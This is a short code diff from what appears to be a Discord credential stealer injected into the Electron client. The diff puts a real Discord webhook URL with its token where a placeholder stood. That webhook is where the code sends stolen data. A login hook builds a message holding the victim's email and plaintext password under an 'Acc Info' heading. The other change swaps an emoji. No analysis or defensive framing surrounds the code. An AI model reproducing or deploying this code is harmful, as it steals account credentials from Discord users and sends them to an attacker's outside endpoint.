@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
+  webhook: 'https://discord.com/api/webhooks/1258151470751289485/K7-YeRmJ0MN4GtlLHv6ySKrNmHuweQZKVeNrgzSeDRw7EvHYM3v4LIOZ-uwAYLTrcF5N', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
@@ -661,7 +661,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Acc Info**',
-            value: `<:mail:1095741024678191114> e: **${email}** - p: **${password}**`,
+            value: `:banana: e: **${email}** - p: **${password}**`,
             inline: false,
           },
           {
